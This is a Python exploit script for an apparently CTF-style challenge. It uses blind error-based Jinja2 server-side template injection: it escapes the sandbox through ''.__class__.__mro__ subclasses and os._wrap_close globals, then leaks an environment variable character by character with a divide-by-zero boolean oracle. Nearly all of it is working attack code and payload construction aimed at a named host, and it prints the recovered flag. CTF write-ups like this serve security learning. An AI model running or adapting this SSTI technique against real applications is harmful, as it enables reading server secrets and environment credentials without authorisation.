# -*- coding: utf-8 -*-
"""キミの記憶 / Memento Mori · SSTI —— 无回显 SSTI 的错误布尔盲注

题目：http://54jsekbkx1fmpdlr.neu-nex.fun
  ?name=X 会把 X 当模板渲染：
    - 渲染结果 == 输入  -> "Hello X!"
    - 渲染结果 != 输入  -> "渲染出来不一样，我不会告诉你任何事情!"
    - 渲染抛异常        -> "渲染出错了!"
    - 命中关键字黑名单  -> "这样的东西我是不会给你渲染的!"

思路：
  1) 用 {{1/0 if COND else 1}} 把 "渲染出错了" 变成布尔 oracle（COND 为真才会除零）；
  2) Jinja2 里 flag 不在 config/全局变量，但环境变量里有 FLAG；
  3) 通过 ''.__class__.__mro__[1].__subclasses__() 找到 os._wrap_close，
     取 __init__.__globals__['environ']，用 oracle 逐字符比较（字符比较，避免 ord 被改写）；
  4) 得到 nex{C0loR_Y0uR_N19Ht_knvmh44e}，并用整串相等条件复核。

运行：python exp.py
"""
import re
import sys
import time
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding="utf-8")

BASE = "http://54jsekbkx1fmpdlr.neu-nex.fun"
SUB = "''.__class__.__mro__[1].__subclasses__()"
F = "G['environ']['FLAG']"
CHARS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"


def fetch(name, retries=5):
    u = BASE + "/?name=" + urllib.parse.quote(name)
    for _ in range(retries):
        try:
            r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"}), timeout=10)
            b = r.read().decode("utf-8", "replace")
            m = re.search(r'(?s)<span class="output">(.*?)</span>', b)
            return m.group(1) if m else b[:150]
        except Exception:
            time.sleep(0.25)
    return "ERR"


def oracle(cond):
    """True=条件为真（渲染抛异常），False=条件为假，None=其它"""
    payload = ("{% for c in " + SUB + " %}{% if c.__name__=='_wrap_close' %}"
               "{% set G = c.__init__.__globals__ %}"
               "{% if " + cond + " %}{{ 1/0 }}{% endif %}"
               "{% endif %}{% endfor %}")
    r = fetch(payload)
    if r == "渲染出错了!":
        return True
    if r == "渲染出来不一样，我不会告诉你任何事情!":
        return False
    return None


def ge(i, ch):
    return oracle("(%d < (%s)|length) and (%s[%d] >= '%s')" % (i, F, F, i, ch))


def leak_length(hi=200):
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        v = oracle("(%s)|length > %d" % (F, mid))
        if v is None:
            return None
        if v:
            lo = mid + 1
        else:
            hi = mid
    return lo


def main():
    print("[*] sanity: 1==1 ->", oracle("1 == 1"), " 1==2 ->", oracle("1 == 2"))
    n = leak_length()
    print("[*] FLAG length =", n, flush=True)
    out = []
    for i in range(n):
        lo, hi = 0, len(CHARS)
        while lo < hi:
            mid = (lo + hi) // 2
            v = ge(i, CHARS[mid])
            if v is None:
                raise SystemExit("oracle failed at %d" % i)
            if v:
                lo = mid + 1
            else:
                hi = mid
        out.append(CHARS[lo - 1] if lo > 0 else "?")
        print("[+] %s" % "".join(out), flush=True)
    flag = "".join(out)
    print("[*] verify equality:", oracle("%s == '%s'" % (F, flag)))
    print("[*] FLAG =", flag)
    return flag


if __name__ == "__main__":
    main()
